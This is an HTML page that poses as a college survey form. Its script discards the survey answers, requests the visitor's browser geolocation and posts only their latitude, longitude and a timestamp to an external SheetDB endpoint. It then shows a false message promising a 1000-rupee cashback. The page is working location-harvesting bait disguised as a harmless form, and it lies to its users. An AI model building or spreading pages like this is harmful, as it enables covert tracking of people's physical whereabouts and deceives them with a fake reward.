<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>College Survey Form with Location</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #f0f4f8;
    margin: 0;
    padding: 2rem;
    display: flex;
    justify-content: center;
  }
  form {
    background: white;
    max-width: 500px;
    width: 100%;
    padding: 2rem 2.5rem;
    border-radius: 8px;
    box-shadow: 0 6px 20px rgba(0,0,0,0.1);
  }
  h2 {
    margin-bottom: 1.5rem;
    color: #333;
    text-align: center;
  }
  label {
    display: block;
    margin-top: 1rem;
    font-weight: 600;
    color: #555;
  }
  input, select, textarea {
    width: 100%;
    padding: 0.6rem 0.8rem;
    margin-top: 0.3rem;
    border: 1.8px solid #ccc;
    border-radius: 5px;
    font-size: 1rem;
    font-family: inherit;
    transition: border-color 0.3s ease;
  }
  input:focus, select:focus, textarea:focus {
    border-color: #007BFF;
    outline: none;
  }
  button {
    margin-top: 1.8rem;
    width: 100%;
    background-color: #007BFF;
    border: none;
    color: white;
    padding: 0.75rem;
    font-size: 1.1rem;
    font-weight: 700;
    border-radius: 6px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #0056b3;
  }
  .message {
    margin-top: 1rem;
    text-align: center;
    font-weight: 600;
  }
  .message.success {
    color: green;
  }
  .message.error {
    color: red;
  }
</style>
</head>
<body>

<form id="surveyForm">
  <h2>College Survey Form</h2>

  <label for="name">Full Name *</label>
  <input type="text" id="name" name="name" required />

  <label for="email">Email Address *</label>
  <input type="email" id="email" name="email" required />

  <label for="college">College Name *</label>
  <input type="text" id="college" name="college" required />

  <label for="course">Course *</label>
  <select id="course" name="course" required>
    <option value="" disabled selected>Select your course</option>
    <option value="Computer Science">Computer Science</option>
    <option value="Electrical Engineering">Electrical Engineering</option>
    <option value="Mechanical Engineering">Mechanical Engineering</option>
    <option value="Civil Engineering">Civil Engineering</option>
    <option value="Other">Other</option>
  </select>

  <label for="year">Year of Study *</label>
  <select id="year" name="year" required>
    <option value="" disabled selected>Select your year</option>
    <option value="1st Year">1st Year</option>
    <option value="2nd Year">2nd Year</option>
    <option value="3rd Year">3rd Year</option>
    <option value="4th Year">4th Year</option>
  </select>

  <label for="comments">Comments or Feedback</label>
  <textarea id="comments" name="comments" rows="4" placeholder="Your thoughts..."></textarea>

  <button type="submit">Submit Survey</button>
  <p id="msg" class="message"></p>
</form>

<script>
  const form = document.getElementById('surveyForm');
  const msg = document.getElementById('msg');

  // Replace with your actual API endpoint (SheetDB or other)
  const API_URL = "https://sheetdb.io/api/v1/g0jdtpbi0265s";

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    msg.textContent = "Requesting location permission...";
    msg.className = "message";

    // Get user location
    if (!navigator.geolocation) {
      msg.textContent = "Geolocation is not supported by your browser.";
      msg.classList.add("error");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const dataToSend = {
          data: [{
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            timestamp: new Date().toISOString()
          }]
        };

        try {
          const res = await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(dataToSend)
          });

          if (res.ok) {
            msg.textContent = "Thank you! You earned a cashback of 1000 rupees.";
            msg.classList.add("success");
            form.reset();
          } else {
            throw new Error("Failed to submit data");
          }
        } catch (err) {
          msg.textContent = "Error sending location data. Please try again.";
          msg.classList.add("error");
        }
      },
      (error) => {
        msg.textContent = "Location permission denied.";
        msg.classList.add("error");
      }
    );
  });
</script>

</body>
</html>
